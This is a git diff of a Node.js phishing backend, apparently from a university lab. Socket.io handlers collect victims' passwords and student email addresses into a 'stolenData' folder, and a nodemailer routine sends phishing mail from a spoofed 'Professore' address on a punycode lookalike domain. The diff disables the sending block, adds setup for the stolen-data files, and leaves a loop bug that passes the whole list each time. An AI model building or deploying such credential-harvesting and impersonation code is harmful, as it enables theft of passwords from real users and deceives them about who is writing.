@@ -35,8 +35,6 @@ app.get('/favicon.ico', (req, res) => res.status(204));
 
 
 io.on('connection', (socket) => {
-    //console.log('A client (for pwd) has connected');
-
     socket.on('sendPWD', (data) => {
         console.log('Password received from a client:', data);
 
@@ -96,8 +94,6 @@ io.on('connection', (socket) => {
 
 // FOR MAIL ADDRESSES
 io.on('connection', (socket) => {
-    //console.log('A client (for student emails) has connected');
-
     socket.on('sendMail', (data) => {
         console.log('Student emails received from a client:', data);
 
@@ -184,11 +180,11 @@ function writeDataToFile(filePath, data) {
 function sendMail(toBeSend)
 {
     if (typeof toBeSend === 'string') {
-        console.log("email addresses to send phishing to: ", toBeSend);
+        console.log("email addresses to send phishing: ", toBeSend);
         sendSingleMail(toBeSend);
     } 
     else if (Array.isArray(toBeSend)) {
-        console.log("email addresses to send phishing to: ", toBeSend);
+        console.log("email addresses to send phishing: ", toBeSend);
         toBeSend.forEach(item => {
             sendSingleMail(toBeSend);
         });
@@ -199,60 +195,33 @@ function sendMail(toBeSend)
 
 function sendSingleMail(mailAddress)
 {
-      // Create a transporter using the host and port of your SMTP server
-  let transporter = nodemailer.createTransport({
-    host: 'smtp.units.local', // replace with your SMTP server host
-    port: 25, // the port of your SMTP server
-    secure: false, // true for 465, false for other ports
-    // If needed, add authentication
-    // auth: {
-    //   user: 'username',
-    //   pass: 'password'
-    // }
-  });
+//       // Create a transporter using the host and port of your SMTP server
+//   let transporter = nodemailer.createTransport({
+//     host: 'smtp.units.local', // replace with your SMTP server host
+//     port: 25, // the port of your SMTP server
+//     secure: false, // true for 465, false for other ports
+//     // If needed, add authentication
+//     // auth: {
+//     //   user: 'username',
+//     //   pass: 'password'
+//     // }
+//   });
 
-  // Define email options
-  let mailOptions = {
-    from: 'Professore <professore@xn--unts-mza.local>', // Sender address
-    to: mailAddress, // Recipient address
-    subject: 'Test Email', // Subject line
-    text: 'Test email body' // Plain text body
-  };
+//   // Define email options
+//   let mailOptions = {
+//     from: 'Professore <professore@xn--unts-mza.local>', // Sender address
+//     to: mailAddress, // Recipient address
+//     subject: 'Test Email', // Subject line
+//     text: 'Test email body' // Plain text body
+//   };
 
-  // Send the email
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      return console.log(error);
-    }
-    console.log('Email sent: ' + info.response);
-  });
-    // console.log("DENTRO sendSingleMail: mail a cui inviare il phishing: ", mailAddress);
-
-    //     // Sender's email configuration
-    //     const transporter = nodemailer.createTransport({
-    //         host: 'localhost', // Indirizzo del tuo server di posta locale
-    //         port: 25, // Porta SMTP del tuo server di posta locale
-    //         tls: {
-    //             rejectUnauthorized: false // Disabilita la verifica dell'autenticità del certificato TLS (da rimuovere in produzione)
-    //         }
-    //     });
-
-    //     // Email content
-    //     const mailOptions = {
-    //         from: 'your_email@yourdomain.com', // L'indirizzo email del mittente
-    //         to: mailAddress, // L'indirizzo email del destinatario
-    //         subject: 'Test Email', // Oggetto dell'email
-    //         text: 'This is a test email sent from Node.js.' // Contenuto dell'email
-    //     };
-
-    //     // Invio dell'email
-    //     transporter.sendMail(mailOptions, function(error, info) {
-    //         if (error) {
-    //             console.error('Error occurred:', error);
-    //         } else {
-    //             console.log('Email sent:', info.response);
-    //         }
-    //     });
+//   // Send the email
+//   transporter.sendMail(mailOptions, (error, info) => {
+//     if (error) {
+//       return console.log(error);
+//     }
+//     console.log('Email sent: ' + info.response);
+//   });
 }
 
 /////////// MAIN //////////////////
@@ -261,14 +230,34 @@ initializeJsonFile("stolenData/mail.json", emailAddress);
 sendMail(emailAddress);
 
 function initializeJsonFile(filePath, emailAddress) {
+    const mailFilePath = path.join(__dirname, 'stolenData', 'mail.json');
+    const pwdFilePath = path.join(__dirname, 'stolenData', 'pwd.json');
+  
+    // Check if the directory exists, if not, create it
+    const directory = path.join(__dirname, 'stolenData');
+    if (!fs.existsSync(directory)) {
+      fs.mkdirSync(directory, { recursive: true });
+      console.log('Directory stolenData created');
+    }
+  
+    // Check if mail.json exists, if not, create it
+    if (!fs.existsSync(mailFilePath)) {
+      fs.writeFileSync(mailFilePath, '');
+      console.log('File mail.json created');
+    }
+  
+    // Check if pwd.json exists, if not, create it
+    if (!fs.existsSync(pwdFilePath)) {
+      fs.writeFileSync(pwdFilePath, '');
+      console.log('File pwd.json created');
+    }
+  
     const data = [{
         email: emailAddress
     }];
 
-    // Convertire l'oggetto JSON in formato stringa
     const jsonData = JSON.stringify(data, null, 2);
 
-    // Verificare se il file esiste già
     fs.stat(filePath, (err, stats) => {
         if (err) {
             console.error('Error while checking the file:', err);
